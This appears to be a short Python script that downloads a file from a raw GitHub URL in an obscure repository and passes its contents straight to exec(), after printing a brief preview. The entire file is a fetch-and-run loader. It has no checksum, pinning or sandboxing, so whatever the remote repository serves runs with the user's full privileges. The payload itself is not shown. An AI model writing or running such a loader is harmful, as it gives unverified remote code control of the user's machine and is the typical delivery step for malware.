import requests

# URL of the remote Python script
url = "https://raw.githubusercontent.com/nothingExistend/recipy/refs/heads/main/code.py"

try:
    # Download the content of the Python file
    response = requests.get(url)
    response.raise_for_status()  # Raise an error for bad status

    code = response.text
    print("Downloaded code:\n", code[:200], '...\n')  # Show a preview of the code

    # Execute the downloaded code
    exec(code, {"__name__": "__main__"})

except requests.RequestException as e:
    print("Failed to download the file:", e)
except Exception as e:
    print("Error while executing the code:", e)
